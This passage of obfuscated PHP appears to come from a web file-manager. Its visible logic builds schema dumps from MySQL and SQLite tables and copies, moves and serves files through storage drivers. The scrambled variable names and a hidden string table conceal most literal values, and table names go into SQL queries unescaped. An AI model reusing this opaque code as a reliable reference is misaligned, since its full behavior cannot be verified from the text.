fwrite($Î†ï…ÂĞ, $‰á´°­à[$èÇßÖñë[13]] . PHP_EOL . PHP_EOL); if (!in_array($éÛî€, $‘¾¦İÆÜ)) { fwrite($‰À—¡ğœ, $‰á´°­à[$èÇßÖñë[889]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ãæï¿¦¾ as $éÛî€) { $‰á´°­à = $this->sqlFromMysql($éÛî€); if (!$‰á´°­à[$èÇßÖñë[889]]) { continue; } fwrite($‰À—¡ğœ, $‰á´°­à[$èÇßÖñë[889]] . PHP_EOL . PHP_EOL); if (!in_array($éÛî€, $‘¾¦İÆÜ)) { fwrite($Î†ï…ÂĞ, $‰á´°­à[$èÇßÖñë[13]] . PHP_EOL . PHP_EOL); } } } fclose($‰À—¡ğœ); fclose($Î†ï…ÂĞ); $á‹Âö´¼ = array($èÇßÖñë[889] => $ëå‘´‡Ç, $èÇßÖñë[13] => $úÄ›¿Á¤); return $Øõõ½… ? $á‹Âö´¼[$Øõõ½…] : $á‹Âö´¼; } public function dbType($“¢ğ›‰æ = false) { $ç¤ùíõ‹ =& $_SERVER[®»±”ó²]; $¹·ÚÇ´õ = $“¢ğ›‰æ ? $GLOBALS[$ç¤ùíõ‹[6]][$ç¤ùíõ‹[21]] : $this->database; $¹·ÚÇ´õ = array_change_key_case($¹·ÚÇ´õ); $ˆ¦ˆöÀõ = $¹·ÚÇ´õ[$ç¤ùíõ‹[1054]]; if ($ˆ¦ˆöÀõ == $ç¤ùíõ‹[1051]) { $©úçÓÔ¥ = explode($ç¤ùíõ‹[4], $¹·ÚÇ´õ[$ç¤ùíõ‹[1060]]); $ˆ¦ˆöÀõ = $©úçÓÔ¥[0]; } $Êû±Ş = array($ç¤ùíõ‹[1184] => $ç¤ùíõ‹[13], $ç¤ùíõ‹[999] => $ç¤ùíõ‹[889]); if (isset($Êû±Ş[$ˆ¦ˆöÀõ])) { $ˆ¦ˆöÀõ = $Êû±Ş[$ˆ¦ˆöÀõ]; } return $ˆ¦ˆöÀõ; } public function sqlFromMysql($€©½¥ëÇ, $ç„¿ÃÃì = '') { $åÌÅĞÂ’ =& $_SERVER[®»±”ó²]; $ÚºÔñÖ = $this->model()->db(); $šÑÏ·âµ = $ÚºÔñÖ->query($åÌÅĞÂ’[1185] . $€©½¥ëÇ . $åÌÅĞÂ’[463]); if (!$šÑÏ·âµ || !$šÑÏ·âµ[0]) { return !1; } $¾»›‚™Â = _get($šÑÏ·âµ[0], $åÌÅĞÂ’[1186], $åÌÅĞÂ’[12]); if (!$¾»›‚™Â) { return !1; } $¥éÜ–”Ë = "\104\x52\117\x50\40\124\101\102\114\105\x20\x49\x46\x20\x45\130\111\123\x54\x53\x20\140{$€©½¥ëÇ}\140\x3b" . PHP_EOL . $¾»›‚™Â . $åÌÅĞÂ’[74]; if ($ç„¿ÃÃì && $ç„¿ÃÃì == $åÌÅĞÂ’[889]) { return $¥éÜ–”Ë; } $ÎÙØÎ°½ = array_change_key_case($GLOBALS[$åÌÅĞÂ’[6]][$åÌÅĞÂ’[21]]); $…—Èú¤ = $ÎÙØÎ°½[$åÌÅĞÂ’[1059]]; $î·¾Ñ¢ñ = $åÌÅĞÂ’[1187] . $…—Èú¤ . $åÌÅĞÂ’[1188] . $€©½¥ëÇ . $åÌÅĞÂ’[58]; $ì´ğÛò‰ = $åÌÅĞÂ’[1189] . $€©½¥ëÇ . $åÌÅĞÂ’[987]; $›çã×è¹ = $ÚºÔñÖ->query($î·¾Ñ¢ñ); if (empty($›çã×è¹)) { $á¯¸î° = array($åÌÅĞÂ’[889] => $åÌÅĞÂ’[12], $åÌÅĞÂ’[13] => $åÌÅĞÂ’[12]); return $ç„¿ÃÃì ? $á¯¸î°[$ç„¿ÃÃì] : $á¯¸î°; } $ƒÁßÕ¸£ = $ÚºÔñÖ->query($ì´ğÛò‰); $ß•»Ò = $åÌÅĞÂ’[12]; $¹Ğµ®À = array(); foreach ($ƒÁßÕ¸£ as $Ğú­İ±¿) { if (!$ß•»Ò && $Ğú­İ±¿[$åÌÅĞÂ’[1190]] == $åÌÅĞÂ’[1191]) { $ß•»Ò = $Ğú­İ±¿[$åÌÅĞÂ’[1192]]; } if (isset($¹Ğµ®À[$Ğú­İ±¿[$åÌÅĞÂ’[1190]]])) { $¹Ğµ®À[$Ğú­İ±¿[$åÌÅĞÂ’[1190]]][$åÌÅĞÂ’[1193]][] = $Ğú­İ±¿[$åÌÅĞÂ’[1192]]; continue; } $¹Ğµ®À[$Ğú­İ±¿[$åÌÅĞÂ’[1190]]] = array($åÌÅĞÂ’[1194] => $Ğú­İ±¿[$åÌÅĞÂ’[1190]], $åÌÅĞÂ’[1193] => array($Ğú­İ±¿[$åÌÅĞÂ’[1192]]), $åÌÅĞÂ’[1195] => $Ğú­İ±¿[$åÌÅĞÂ’[1196]] == $åÌÅĞÂ’[91] ? 0 : 1); } $‡¡½œ•¢ = array(); foreach ($¹Ğµ®À as $Ğú­İ±¿) { $ÌÚ±•ÆÓ = $Ğú­İ±¿[$åÌÅĞÂ’[1194]] == $åÌÅĞÂ’[1191]; $ÁºşøÀ = array($åÌÅĞÂ’[1197], $Ğú­İ±¿[$åÌÅĞÂ’[1195]] == $åÌÅĞÂ’[91] && !$ÌÚ±•ÆÓ ? $åÌÅĞÂ’[1198] : $åÌÅĞÂ’[12], $åÌÅĞÂ’[1199], $åÌÅĞÂ’[1200] . $€©½¥ëÇ . $åÌÅĞÂ’[11] . ($ÌÚ±•ÆÓ ? $åÌÅĞÂ’[1201] : $Ğú­İ±¿[$åÌÅĞÂ’[1194]]) . $åÌÅĞÂ’[121], $åÌÅĞÂ’[1202], $åÌÅĞÂ’[121] . $€©½¥ëÇ . $åÌÅĞÂ’[121], $åÌÅĞÂ’[1203] . implode($åÌÅĞÂ’[1204], $Ğú­İ±¿[$åÌÅĞÂ’[1193]]) . $åÌÅĞÂ’[1205]); $‡¡½œ•¢[] = implode($åÌÅĞÂ’[53], $ÁºşøÀ) . $åÌÅĞÂ’[74]; } $íò‹„Œ = array(); $×³€Á = array($åÌÅĞÂ’[1206] => $åÌÅĞÂ’[1207], $åÌÅĞÂ’[1207] => $åÌÅĞÂ’[1207], $åÌÅĞÂ’[366] => $åÌÅĞÂ’[392], $åÌÅĞÂ’[365] => $åÌÅĞÂ’[392]); foreach ($›çã×è¹ as $Ğú­İ±¿) { $ÁºşøÀ = array($åÌÅĞÂ’[121] . $Ğú­İ±¿[$åÌÅĞÂ’[1208]] . $åÌÅĞÂ’[121], isset($×³€Á[$Ğú­İ±¿[$åÌÅĞÂ’[1209]]]) ? $×³€Á[$Ğú­İ±¿[$åÌÅĞÂ’[1209]]] : $Ğú­İ±¿[$åÌÅĞÂ’[1210]], $Ğú­İ±¿[$åÌÅĞÂ’[1211]] == $åÌÅĞÂ’[985] ? $åÌÅĞÂ’[1212] : $åÌÅĞÂ’[1213], $Ğú­İ±¿[$åÌÅĞÂ’[1208]] == $ß•»Ò ? $åÌÅĞÂ’[1214] : $åÌÅĞÂ’[12], $Ğú­İ±¿[$åÌÅĞÂ’[1036]] ? strtoupper(str_replace($åÌÅĞÂ’[11], $åÌÅĞÂ’[12], $Ğú­İ±¿[$åÌÅĞÂ’[1036]])) : $åÌÅĞÂ’[12]); $íò‹„Œ[] = trim(implode($åÌÅĞÂ’[53], $ÁºşøÀ)); } $œÙ¶öÀî = array($åÌÅĞÂ’[1215] . $€©½¥ëÇ . $åÌÅĞÂ’[1216], $åÌÅĞÂ’[1217] . $€©½¥ëÇ . $åÌÅĞÂ’[1218], implode($åÌÅĞÂ’[50] . PHP_EOL, $íò‹„Œ), $åÌÅĞÂ’[1033]); $ÜØñ¤é = implode(PHP_EOL, array_merge($œÙ¶öÀî, $‡¡½œ•¢)); if ($ç„¿ÃÃì && $ç„¿ÃÃì == $åÌÅĞÂ’[13]) { return $ÜØñ¤é; } $á¯¸î° = array($åÌÅĞÂ’[889] => $¥éÜ–”Ë, $åÌÅĞÂ’[13] => $ÜØñ¤é); return $ç„¿ÃÃì ? $á¯¸î°[$ç„¿ÃÃì] : $á¯¸î°; } public function sqlFromSqlite($‹¤©Š·ƒ, $µÜ©Èá  = '') { $×â£ì =& $_SERVER[®»±”ó²]; $©¶¦Àí€ = $this->model()->db(); $Òœ¦À’ = "\x50\x52\x41\x47\115\101\x20\x54\x41\102\114\x45\x5f\x49\116\106\x4f\40\50\47{$‹¤©Š·ƒ}\47\x29"; $‹­åñ´ = "\x53\x45\x4c\105\x43\x54\40\x2a\x20\x46\122\117\115\x20\163\x71\x6c\x69\x74\x65\x5f\x6d\141\x73\x74\145\x72\40\x57\x48\x45\x52\105\x20\164\142\154\x5f\156\x61\155\145\40\x3d\40\x27{$‹¤©Š·ƒ}\x27"; $ìá…©¹à = $©¶¦Àí€->query($Òœ¦À’); if (empty($ìá…©¹à)) { $÷™óÃÖÌ = array($×â£ì[889] => $×â£ì[12], $×â£ì[13] => $×â£ì[12]); return $µÜ©Èá  ? $÷™óÃÖÌ[$µÜ©Èá ] : $÷™óÃÖÌ; } $ÈĞ™ëæØ = $©¶¦Àí€->query($‹­åñ´); $òÖóçïÖ = $š¦‘ôŒ = array(); foreach ($ÈĞ™ëæØ as $ÂÑ–é«Ï) { if ($ÂÑ–é«Ï[$×â£ì[33]] == $×â£ì[359]) { $òÖóçïÖ[] = $ÂÑ–é«Ï[$×â£ì[1219]]; } else { $š¦‘ôŒ[$ÂÑ–é«Ï[$×â£ì[32]]] = $ÂÑ–é«Ï[$×â£ì[1219]]; } } $Ü¡ÚÓÖ­ = array_merge(array($×â£ì[1215] . $‹¤©Š·ƒ . $×â£ì[121]), $òÖóçïÖ, array_values($š¦‘ôŒ)); $Ü¡ÚÓÖ­ = implode($×â£ì[74] . PHP_EOL, $Ü¡ÚÓÖ­) . $×â£ì[74]; if ($µÜ©Èá  && $µÜ©Èá  == $×â£ì[13]) { return $Ü¡ÚÓÖ­; } $ÈÉí‰˜ = array(); foreach ($š¦‘ôŒ as $ê•×–àœ => $şÎ’¬ÀÓ) { $ç¢û¨ãé = str_replace($×â£ì[1220] . $‹¤©Š·ƒ . $×â£ì[11], $×â£ì[12], $ê•×–àœ); $ç¢û¨ãé = str_replace($‹¤©Š·ƒ . $×â£ì[11], $×â£ì[12], $ê•×–àœ); $ßåËÒ = str_replace(array($×â£ì[121], $×â£ì[1044]), $×â£ì[463], substr($şÎ’¬ÀÓ, stripos($şÎ’¬ÀÓ, $×â£ì[340]))); $ÈÉí‰˜[$ç¢û¨ãé] = $ßåËÒ; } $ßìíŸçé = array(); $åŠŞƒÒ = array($×â£ì[1207] => $×â£ì[1221], $×â£ì[392] => $×â£ì[1222]); $ÙŞ²Â³™ = $ÂÚº¯ëâ = $×â£ì[12]; foreach ($ìá…©¹à as $ÂÑ–é«Ï) { if ($ÂÑ–é«Ï[$×â£ì[57]] == $×â£ì[91]) { $ÙŞ²Â³™ = $ÂÑ–é«Ï[$×â£ì[32]]; } $²È¥Ñ™Š = $ÂÑ–é«Ï[$×â£ì[33]]; if ($²È¥Ñ™Š == $×â£ì[1223] && isset($ÈÉí‰˜[$ÂÑ–é«Ï[$×â£ì[32]]])) { $²È¥Ñ™Š = $×â£ì[1224]; } $š¿£¾Ñ‡ = array($×â£ì[463] . $ÂÑ–é«Ï[$×â£ì[32]] . $×â£ì[463], _get($åŠŞƒÒ, $²È¥Ñ™Š, $²È¥Ñ™Š), $ÂÑ–é«Ï[$×â£ì[35]] == $×â£ì[91] ? $×â£ì[1212] : $×â£ì[1225] . $ÂÑ–é«Ï[$×â£ì[56]], $ÂÑ–é«Ï[$×â£ì[57]] == $×â£ì[91] ? $×â£ì[1226] : $×â£ì[12]); $ßìíŸçé[] = trim(implode($×â£ì[53], $š¿£¾Ñ‡)); } foreach ($ÈÉí‰˜ as $ç¢û¨ãé => $ßåËÒ) { if ($ç¢û¨ãé == $×â£ì[1201]) { $˜ƒ¶³² = $ÂÚº¯ëâ = $×â£ì[1227] . $ÙŞ²Â³™ . $×â£ì[1228]; } else { $˜ƒ¶³² = (stripos($ç¢û¨ãé, $×â£ì[11]) ? $×â£ì[1229] : $×â£ì[12]) . ($×â£ì[1230] . $ç¢û¨ãé . $×â£ì[1231] . $ßåËÒ); } $ßìíŸçé[] = $˜ƒ¶³²; } if ($ÙŞ²Â³™ && !$ÂÚº¯ëâ) { $ßìíŸçé = array_merge(array($×â£ì[1227] . $ÙŞ²Â³™ . $×â£ì[1228]), $ßìíŸçé); } $Ó¹¹ÚÕ— = array($×â£ì[1232] . $‹¤©Š·ƒ . $×â£ì[1233], $×â£ì[1234] . $‹¤©Š·ƒ . $×â£ì[1235], implode($×â£ì[50] . PHP_EOL, $ßìíŸçé), $×â£ì[1236]); $¾¥Úù¦Ä = implode(PHP_EOL, $Ó¹¹ÚÕ—); if ($µÜ©Èá  && $µÜ©Èá  == $×â£ì[889]) { return $¾¥Úù¦Ä; } $÷™óÃÖÌ = array($×â£ì[889] => $¾¥Úù¦Ä, $×â£ì[13] => $Ü¡ÚÓÖ­); return $µÜ©Èá  ? $÷™óÃÖÌ[$µÜ©Èá ] : $÷™óÃÖÌ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ïØ’¡Â, $ÎÊæØ¡Õ) { $­·€¼˜Â =& $_SERVER[®»±”ó²]; $á¨ ‹¸Ï = $ÎÊæØ¡Õ; $GLOBALS[$­·€¼˜Â[1237]] = $­·€¼˜Â[1238] . $ïØ’¡Â; Hook::trigger($­·€¼˜Â[1238] . $ïØ’¡Â . $­·€¼˜Â[1239], $á¨ ‹¸Ï); $ñ ¥£ùÃ = self::driverMake($ÎÊæØ¡Õ[0]); if (!$ñ ¥£ùÃ) { return !1; } if (method_exists($ñ ¥£ùÃ, $ïØ’¡Â)) { $Ò‚šŠïù = @call_user_func_array(array($ñ ¥£ùÃ, $ïØ’¡Â), $ÎÊæØ¡Õ); } else { if (method_exists($ñ ¥£ùÃ, $­·€¼˜Â[1240])) { $Ò‚šŠïù = @call_user_func_array(array($ñ ¥£ùÃ, $ïØ’¡Â), $ÎÊæØ¡Õ); } else { if (method_exists(self, $ïØ’¡Â)) { $Ò‚šŠïù = @call_user_func_array(array(self, $ïØ’¡Â), $ÎÊæØ¡Õ); } else { $Ò‚šŠïù = call_user_func_array(array(parent, $ïØ’¡Â), $ÎÊæØ¡Õ); } } } Hook::trigger($­·€¼˜Â[1238] . $ïØ’¡Â . $­·€¼˜Â[1241], $á¨ ‹¸Ï, $Ò‚šŠïù); return $Ò‚šŠïù; } public static function init($¤Í³—İÊ) { return self::driverMake($¤Í³—İÊ); } public static function copy($è›¼„´Í, $Ã¤•ô×¤, $¥ãıËÀÓ = false, $š‡âÍãŸ = false) { return self::copyMoveStart($è›¼„´Í, $Ã¤•ô×¤, $¥ãıËÀÓ, $_SERVER[®»±”ó²][634], $š‡âÍãŸ); } public static function move($ı²ƒ´¡, $•ŞÜ°ƒ, $Á•ôŞû¯ = false, $›‹éÉ¾ = false) { return self::copyMoveStart($ı²ƒ´¡, $•ŞÜ°ƒ, $Á•ôŞû¯, $_SERVER[®»±”ó²][636], $›‹éÉ¾); } public static function copyMoveChildren($Â’½ƒšÛ, $Ü—àËåç, $ÇØä„‚ß = "\143\157\x70\x79", $È‡íË¶¶ = REPEAT_REPLACE) { $½î„éõ =& $_SERVER[®»±”ó²]; $ÉÒÛ÷Ôâ = $Â’½ƒšÛ; $å²ƒÌÑ = self::driverMake($Â’½ƒšÛ); $ĞÁÆ‰©ö = $å²ƒÌÑ->listPath($Â’½ƒšÛ, !0); $Âò÷­¤ = array_merge($ĞÁÆ‰©ö[$½î„éõ[86]], $ĞÁÆ‰©ö[$½î„éõ[85]]); foreach ($Âò÷­¤ as $’­×üĞ) { self::copyMoveStart($’­×üĞ[$½î„éõ[87]], $Ü—àËåç, $È‡íË¶¶, $ÇØä„‚ß, !1); } if ($ÇØä„‚ß == $½î„éõ[636]) { self::remove($ÉÒÛ÷Ôâ); } } private static function copyMoveStart($¸·í³²æ, $é†Â×…‹, $øöŸ‹‘Ë, $×™¥˜Ë¯, $ãÓ˜äÙº) { $©Õ†ÆÆÑ =& $_SERVER[®»±”ó²]; $šÈıµÖ = array($¸·í³²æ, $é†Â×…‹, $øöŸ‹‘Ë, $ãÓ˜äÙº); Hook::trigger($©Õ†ÆÆÑ[1238] . $×™¥˜Ë¯ . $©Õ†ÆÆÑ[1239], $šÈıµÖ); $ƒ³ÓåœÀ = self::copyMove($¸·í³²æ, $é†Â×…‹, $øöŸ‹‘Ë, $×™¥˜Ë¯, $ãÓ˜äÙº); Hook::trigger($©Õ†ÆÆÑ[1238] . $×™¥˜Ë¯ . $©Õ†ÆÆÑ[1241], $šÈıµÖ, $ƒ³ÓåœÀ); return $ƒ³ÓåœÀ; } public static function saveFile($ÊõÙŒªò, $ÔïÍùÂ—, $¹µöüº = true) { $åšÆ«Â§ =& $_SERVER[®»±”ó²]; $ˆ±Ï±ŞÀ = self::info($ÔïÍùÂ—); $‚¹°ª©  = self::driverMake($ÊõÙŒªò); $²…Êïú = self::driverMake($ÔïÍùÂ—); $©ÅØ¬šÀ = !1; if ($²…Êïú->pathParse[$åšÆ«Â§[1242]]) { $©ÅØ¬šÀ = $²…Êïú; $ãĞÏ¦ş = $²…Êïú->pathParse[$åšÆ«Â§[1242]]; $²…Êïú = self::driverMake($ãĞÏ¦ş); } if ($‚¹°ª© ->pathParse[$åšÆ«Â§[1242]]) { $‡š”ã¢ = $‚¹°ª© ->pathParse[$åšÆ«Â§[1242]]; $‚¹°ª©  = self::driverMake($‡š”ã¢); } $äÏ¿’ì¸ = $²…Êïú->pathFather($ÔïÍùÂ—); $Õ¹“¢§ = !0; if (!$¹µöüº && self::driverIsSame($‚¹°ª© , $²…Êïú)) { $Õ¹“¢§ = !1; } $°úûÕÏ˜ = self::copyFile($‚¹°ª© , $ÊõÙŒªò, $²…Êïú, $äÏ¿’ì¸, $ˆ±Ï±ŞÀ[$åšÆ«Â§[32]], $Õ¹“¢§); if ($©ÅØ¬šÀ) { $°úûÕÏ˜ = $©ÅØ¬šÀ->getPathOuter($°úûÕÏ˜); } return $°úûÕÏ˜; } private static function copyMove($£îÎı¦, $÷Œıƒ·©, $î»¤ò·¸, $üæóáÚá, $¯¶œ¹ôé = false) { $†Ö şÊ– =& $_SERVER[®»±”ó²]; if (!$£îÎı¦ || $£îÎı¦ == $†Ö şÊ–[8] || !$÷Œıƒ·©) { return !1; } ignore_timeout(); $š¼“øÊı = self::driverMake($£îÎı¦); $†ÕãÃÅÙ = self::driverMake($÷Œıƒ·©); $ğÄ÷² = $üæóáÚá == $†Ö şÊ–[636]; $‚ï”¯ÌÈ = !1; if ($†ÕãÃÅÙ->pathParse[$†Ö şÊ–[1242]]) { $‚ï”¯ÌÈ = $†ÕãÃÅÙ; $÷Œıƒ·© = $†ÕãÃÅÙ->pathParse[$†Ö şÊ–[1242]]; $†ÕãÃÅÙ = self::driverMake($÷Œıƒ·©); } if ($š¼“øÊı->pathParse[$†Ö şÊ–[1242]]) { $£îÎı¦ = $š¼“øÊı->pathParse[$†Ö şÊ–[1242]]; $š¼“øÊı = self::driverMake($£îÎı¦); } self::check($š¼“øÊı, $£îÎı¦, $†ÕãÃÅÙ, $÷Œıƒ·©); Hook::trigger($†Ö şÊ–[1243], $š¼“øÊı, $£îÎı¦, $†ÕãÃÅÙ, $÷Œıƒ·©); $ÃÀî–» = self::driverIsSame($š¼“øÊı, $†ÕãÃÅÙ); if ($ÃÀî–») { if ($üæóáÚá == $†Ö şÊ–[636] && !method_exists($†ÕãÃÅÙ, $†Ö şÊ–[1244]) && trim($÷Œıƒ·©, $†Ö şÊ–[8]) == trim($†ÕãÃÅÙ->pathFather($£îÎı¦), $†Ö şÊ–[8])) { if ($š¼“øÊı->pathThis($£îÎı¦) != $¯¶œ¹ôé && !$š¼“øÊı->isOsDriver()) { return $š¼“øÊı->rename($£îÎı¦, $¯¶œ¹ôé); } return $†ÕãÃÅÙ->getPathOuter($£îÎı¦); } if (method_exists($†ÕãÃÅÙ, $üæóáÚá)) { return $†ÕãÃÅÙ->{$üæóáÚá}($£îÎı¦, $÷Œıƒ·©, $î»¤ò·¸, $¯¶œ¹ôé); } } if ($ÃÀî–» && $üæóáÚá == $†Ö şÊ–[636] && $†ÕãÃÅÙ->getType() == $†Ö şÊ–[109]) { $ÔàÙ¹õ = $†ÕãÃÅÙ->movePath($£îÎı¦, $÷Œıƒ·©, $¯¶œ¹ôé); if ($ÔàÙ¹õ) { return $ÔàÙ¹õ; } } $‘¦Šßè‚ = $š¼“øÊı->isFile($£îÎı¦); if (!$‘¦Šßè‚ && $†ÕãÃÅÙ->getType() == $†Ö şÊ–[838] && $š¼“øÊı->getType() == $†Ö şÊ–[109]) { $ÔàÙ¹õ = $†ÕãÃÅÙ->copyFolderFromIO($š¼“øÊı, $£îÎı¦, $÷Œıƒ·©, $î»¤ò·¸, $ğÄ÷², $¯¶œ¹ôé); } else { $ÔàÙ¹õ = self::copyPath($š¼“øÊı, $£îÎı¦, $†ÕãÃÅÙ, $÷Œıƒ·©, $î»¤ò·¸, $ğÄ÷², $‘¦Šßè‚, $¯¶œ¹ôé); } if ($ÔàÙ¹õ && $ğÄ÷²) { $š¼“øÊı->remove($£îÎı¦); } if ($‚ï”¯ÌÈ) { $ÔàÙ¹õ = $‚ï”¯ÌÈ->getPathOuter($ÔàÙ¹õ); } return $ÔàÙ¹õ; } private static function check($‘Üë–€¹, $õ€…¹¹å, $¡èÂÑ‹³, &$ÒÆÌÈü ) { $¡Î˜ò…„ =& $_SERVER[®»±”ó²]; if (self::driverIsSame($‘Üë–€¹, $¡èÂÑ‹³) && $‘Üë–€¹->isFolder($õ€…¹¹å) && $‘Üë–€¹->isParentOf($õ€…¹¹å, $ÒÆÌÈü )) { show_json(LNG($¡Î˜ò…„[1245]), !1); } if (!$‘Üë–€¹->exist($õ€…¹¹å)) { show_json(LNG($¡Î˜ò…„[108]), !1); } } private static function copyPath($³äç¯ó¥, $Ó…Û¢‚”, $öÉÙƒ»™, $¤ıÓñÁ¶, $ ±‡µ¨Ñ, $¾õ€ƒé±, $¾ßï¡±, $ëøÒ½å¼ = false, $ßÛ¡æÂÂ = true) { $û›¹Š =& $_SERVER[®»±”ó²]; $ÌËˆ²Äè = empty($ëøÒ½å¼) && $ëøÒ½å¼ !== $û›¹Š[231] ? $³äç¯ó¥->pathThis($Ó…Û¢‚”) : $ëøÒ½å¼; if ($ ±‡µ¨Ñ) { $¿™Û¬¨Ø = $öÉÙƒ»™->fileNameExist($¤ıÓñÁ¶, $ÌËˆ²Äè); $¯ÛÂĞ—Ş = $ÌËˆ²Äè; $ÌËˆ²Äè = $öÉÙƒ»™->fileNameAuto($¤ıÓñÁ¶, $ÌËˆ²Äè, $ ±‡µ¨Ñ, !$¾ßï¡±); if (!$¿™Û¬¨Ø || $¯ÛÂĞ—Ş != $ÌËˆ²Äè) { $ ±‡µ¨Ñ = !1; } if ($ßÛ¡æÂÂ && !$ ±‡µ¨Ñ) { $öÉÙƒ»™->_data[$û›¹Š[1246]] = !0; } } if ($¾ßï¡±) { return self::copyFile($³äç¯ó¥, $Ó…Û¢‚”, $öÉÙƒ»™, $¤ıÓñÁ¶, $ÌËˆ²Äè, $¾õ€ƒé±); } if ($ ±‡µ¨Ñ == REPEAT_RENAME_FOLDER) { $ ±‡µ¨Ñ = !1; } $€ïçÎ‹à = rtrim($¤ıÓñÁ¶, $û›¹Š[8]) . $û›¹Š[8] . $ÌËˆ²Äè; $¡‰‹Öø = $öÉÙƒ»™->mkdir($öÉÙƒ»™->getPath($€ïçÎ‹à), $ ±‡µ¨Ñ); $¤ıÓñÁ¶ = $öÉÙƒ»™->getPathInner($¡‰‹Öø); $Õ©¹¼Ëš = $³äç¯ó¥->listPath($Ó…Û¢‚”, !0); $Õ©¹¼Ëš = is_array($Õ©¹¼Ëš) ? $Õ©¹¼Ëš : array($û›¹Š[86] => array(), $û›¹Š[85] => array()); $šú«ñÏÖ = array_merge($Õ©¹¼Ëš[$û›¹Š[86]], $Õ©¹¼Ëš[$û›¹Š[85]]); foreach ($šú«ñÏÖ as $œ‡´Ñ´²) { $ƒµ¼‚Ã¾ = $œ‡´Ñ´²[$û›¹Š[33]] == $û›¹Š[233]; $Ó…Û¢‚” = $³äç¯ó¥->getPathInner($œ‡´Ñ´²[$û›¹Š[87]]); $¤£ùıû¥ = self::copyPath($³äç¯ó¥, $Ó…Û¢‚”, $öÉÙƒ»™, $¤ıÓñÁ¶, $ ±‡µ¨Ñ, $¾õ€ƒé±, $ƒµ¼‚Ã¾, !1, !1); if (!$¤£ùıû¥) { IO::errorTips($û›¹Š[1247] . $Ó…Û¢‚” . $û›¹Š[73] . $¤ıÓñÁ¶); } } self::copyMoveKeepInfo($³äç¯ó¥, $Ó…Û¢‚”, $¡‰‹Öø); return $¡‰‹Öø; } private static function copyFile($İçÍË, $÷Â››íÛ, $‰¿±Í‚ğ, $Ÿùí‘£À, $™”¢…å¿, $ì™ÍÂÖ¶) { $ë£‰ä–† =& $_SERVER[®»±”ó²]; $Ÿùí‘£À = $‰¿±Í‚ğ->getPath(rtrim($Ÿùí‘£À, $ë£‰ä–†[8]) . $ë£‰ä–†[8] . $™”¢…å¿); $¯©£ÛğÊ = $ë£‰ä–†[1248] . time() . rand_string(5); Hook::trigger($ë£‰ä–†[1249], $İçÍË, $÷Â››íÛ, $‰¿±Í‚ğ, $Ÿùí‘£À, $™”¢…å¿, $¯©£ÛğÊ); if (self::driverIsSame($İçÍË, $‰¿±Í‚ğ)) { if ($ì™ÍÂÖ¶) { $Š¼–­†Ä = $‰¿±Í‚ğ->moveFile($÷Â››íÛ, $Ÿùí‘£À); } else { $Š¼–­†Ä = $‰¿±Í‚ğ->copyFile($÷Â››íÛ, $Ÿùí‘£À); } Hook::trigger($ë£‰ä–†[1250], $İçÍË, $÷Â››íÛ, $‰¿±Í‚ğ, $Ÿùí‘£À, $™”¢…å¿, $Š¼–­†Ä); self::copyMoveKeepInfo($İçÍË, $÷Â››íÛ, $Š¼–­†Ä); return $Š¼–­†Ä; } $›¢ÈÎÄğ = TEMP_FILES; if ($GLOBALS[$ë£‰ä–†[6]][$ë£‰ä–†[92]][$ë£‰ä–†[879]]) { $›¢ÈÎÄğ = $GLOBALS[$ë£‰ä–†[6]][$ë£‰ä–†[92]][$ë£‰ä–†[879]]; } $ÉûŸì´ = $›¢ÈÎÄğ; mk_dir($ÉûŸì´); $îü¦ïÈ§ = $ÉûŸì´ . $¯©£ÛğÊ; $Ï‘ÔÂ = $îü¦ïÈ§; $îü¦ïÈ§ = $İçÍË->download($÷Â››íÛ, $îü¦ïÈ§); $îü¦ïÈ§ = $İçÍË->iconvApp($îü¦ïÈ§); if (substr($îü¦ïÈ§, strlen($›¢ÈÎÄğ)) == $›¢ÈÎÄğ) { $ì™ÍÂÖ¶ = !0; } $Š¼–­†Ä = $‰¿±Í‚ğ->upload($Ÿùí‘£À, $îü¦ïÈ§, $ì™ÍÂÖ¶); self::remove($Ï‘ÔÂ); Hook::trigger($ë£‰ä–†[1250], $İçÍË, $÷Â››íÛ, $‰¿±Í‚ğ, $Ÿùí‘£À, $™”¢…å¿, $Š¼–­†Ä); self::copyMoveKeepInfo($İçÍË, $÷Â››íÛ, $Š¼–­†Ä); return $Š¼–­†Ä; } private static function copyMoveKeepInfo($ÏŸùŸ•Ñ, $¤Â©àˆ¨, $Æå°‹•©) { if (!$Æå°‹•©) { return; } $ËİôÇ¡• = $ÏŸùŸ•Ñ->info($¤Â©àˆ¨); if (!is_array($ËİôÇ¡•)) { return; } IO::setModifyTime($Æå°‹•©, $ËİôÇ¡•[$_SERVER[®»±”ó²][88]]); } public static function pathFather($˜–çÇš) { $¹éƒËÍ = IO::init($˜–çÇš); $¶£šÆ€Š = $¹éƒËÍ->pathFather($¹éƒËÍ->path); return $¹éƒËÍ->getPathOuter($¶£šÆ€Š); } public static function fileOut($Šß‹Ä”, $ÑğÎòã× = false, $Î³çòÔ = false, $íÉ¶É  = '') { $ùİåúàÅ = self::driverMake($Šß‹Ä”); if ($ùİåúàÅ->isFileOutServer()) { return $ùİåúàÅ->fileOutServer($Šß‹Ä”, $ÑğÎòã×, $Î³çòÔ, $íÉ¶É ); } return $ùİåúàÅ->fileOut($Šß‹Ä”, $ÑğÎòã×, $Î³çòÔ, $íÉ¶É ); } public static function fileOutImage($¢øµ”©«, $Ìò¾®€¾ = 250) { $—ãÆîºÖ = array(250, 600, 1200, 2000, 3000, 5000); for ($›ıßó˜¨ = 0; $›ıßó˜¨ < count($—ãÆîºÖ); $›ıßó˜¨++) { if ($›ıßó˜¨ == 0 && $Ìò¾®€¾ <= $—ãÆîºÖ[$›ıßó˜¨]) { $Ìò¾®€¾ = $—ãÆîºÖ[$›ıßó˜¨]; break; } else { if ($Ìò¾®€¾ > $—ãÆîºÖ[$›ıßó˜¨ - 1] && $Ìò¾®€¾ <= $—ãÆîºÖ[$›ıßó˜¨]) { $Ìò¾®€¾ = $—ãÆîºÖ[$›ıßó˜¨]; break; } else { if ($›ıßó˜¨ == count($—ãÆîºÖ) - 1 && $Ìò¾®€¾ > $—ãÆîºÖ[$›ıßó˜¨]) { $Ìò¾®€¾ = $—ãÆîºÖ[$›ıßó˜¨]; break; } } } } $¬¯ø—æ½ = self::driverMake($¢øµ”©«); if ($¬¯ø—æ½->isFileOutServer()) { return $¬¯ø—æ½->fileOutImageServer($¢øµ”©«, $Ìò¾®€¾); } return $¬¯ø—æ½->fileOutImage($¢øµ”©«, $Ìò¾®€¾); } private static function 